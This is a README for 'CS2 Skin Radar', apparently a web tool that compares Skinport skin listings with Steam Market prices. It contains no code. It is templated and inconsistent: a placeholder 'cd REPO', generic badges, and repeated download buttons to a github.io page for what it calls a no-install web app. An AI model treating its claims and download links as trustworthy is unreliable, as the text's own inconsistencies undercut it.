# CS2 Skin Radar - Game Script Utility 2026

> **An automated web tool for Counter-Strike 2 market monitoring that evaluates active Skinport inventory against baseline Steam Market pricing to spot price drops.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mason-krueger1957/cs2-market-skin-radar?style=flat-square)](https://github.com/mason-krueger1957/cs2-market-skin-radar)

---

<p align="center">
  <a href="https://mason-krueger1957.github.io/cs2-market-skin-radar/">
    <img src="https://img.shields.io/badge/Download-CS2%20Skin%20Radar%20Script-brightgreen?style=for-the-badge" alt="Download CS2 Skin Radar Script">
  </a>
</p>

> **[Download Latest Build](https://mason-krueger1957.github.io/cs2-market-skin-radar/)**

---

[Download Latest Build](https://mason-krueger1957.github.io/cs2-market-skin-radar/)

---

## Technical Summary

CS2 Skin Radar provides a browser-based solution for tracking Counter-Strike 2 skin offers. By querying API endpoints from Skinport and comparing listing costs against current Steam Market metrics, the tool presents market opportunities based on user-defined criteria.

Designed for efficiency, the dynamic interface features granular parameters for budget, minimum price cut percentage, wear condition, skin type, and StatTrak variants. Quick-action links direct users straight to the respective marketplace listings, while the web instance updates its dataset automatically every three minutes.

---

## Capabilities

- Continuous tracking of Counter-Strike 2 market listings
- Integration with Skinport listing feeds
- Real-time valuation checks via Steam Market reference points
- Customizable minimum percentage discount filter
- Upper price limit controls
- Wear condition selector
- Item type and category filtering
- StatTrak item isolation options
- Quick-access URL generation to Skinport item pages
- Direct reference links to Steam Community Market items
- Automated deployment pipe via GitHub Pages
- Scheduled data updates running on a 3-minute cycle
- Dependency-free stack built solely with standard Web technologies (HTML, CSS, JS)

---

## Getting Started

### Using the Live Web App

Launch the current online release directly:

[Launch CS2 Skin Radar](https://mason-krueger1957.github.io/cs2-market-skin-radar/)

Adjust the filter controls on screen to isolate items matching your target wear, budget, discount floor, type, or StatTrak preference.

### Local Installation

1. Clone or download this repository to your workstation.
2. Navigate to the project directory.
3. Launch a static file web server pointing to the folder.
4. Access the site via your web browser.

Terminal command:

```bash
git clone https://github.com/mason-krueger1957/cs2-market-skin-radar.git
cd REPO
```

Because the frontend is constructed entirely with native JavaScript, CSS, and HTML, no additional build steps or package managers are needed.

---

## Filtering Parameters

Control the scanner output using the on-screen filter set:

| Setting | Function |
|---|---|
| Minimum discount | Filters for offers meeting or exceeding a target discount percentage |
| Maximum price | Restricts output to items below a specific cost threshold |
| Condition | Limits displayed skins to designated wear tiers |
| Category | Restricts inventory items by cosmetic category |
| StatTrak | Controls inclusion of StatTrak-enabled skin variants |
| Refresh cycle | Automated background update executing roughly every 3 minutes |

Available parameters and system behavior may expand as new builds release.

---

## Specifications & Scope

- **Compatible Title:** Counter-Strike 2
- **Runtime Environment:** Web Browser
- **Data Providers:** Skinport live listings & Steam Community Market reference pricing
- **Code Base:** Vanilla HTML, CSS, JavaScript
- **Hosting:** GitHub Pages

This project functions strictly as a browser-side data aggregation and comparison engine. It does not interface with or alter Counter-Strike 2 system files. Marketplace data, link structures, third-party pricing, and API availability remain subject to third-party provider policies.

---

## Frequently Asked Questions

### How do I run the tool?

Simply visit the hosted web build and configure your search parameters. Alternatively, pull the source files and host them on a local server.

### What is the dataset refresh rate?

The scanner periodically updates its item records every three minutes.

### Am I able to filter out specific skin types or price points?

Yes, the interface provides controls for price ceilings, minimum discount thresholds, wear categories, product types, and StatTrak flags.

### Can I modify the core script?

Yes. The application uses plain HTML, CSS, and JS, making it straightforward to adapt or extend the UI and logical filters directly in the repository code.

### Where does the pricing data originate?

The platform parses Skinport catalog data and matches it against standard Steam Market reference values, including direct links to both marketplaces.

### Are there any npm dependencies or framework requirements?

No. The codebase relies entirely on vanilla web standards without external libraries or build chains.

### Where can I open the live version?

Access the online client here:

[Download Latest Build](https://mason-krueger1957.github.io/cs2-market-skin-radar/)

### How do I inspect or clone the codebase?

All frontend code and source files are maintained directly within this GitHub repository for downloading or cloning.

---

## License

Distributed under the GNU General Public License v3.0. Refer to [LICENSE](LICENSE) for full details.
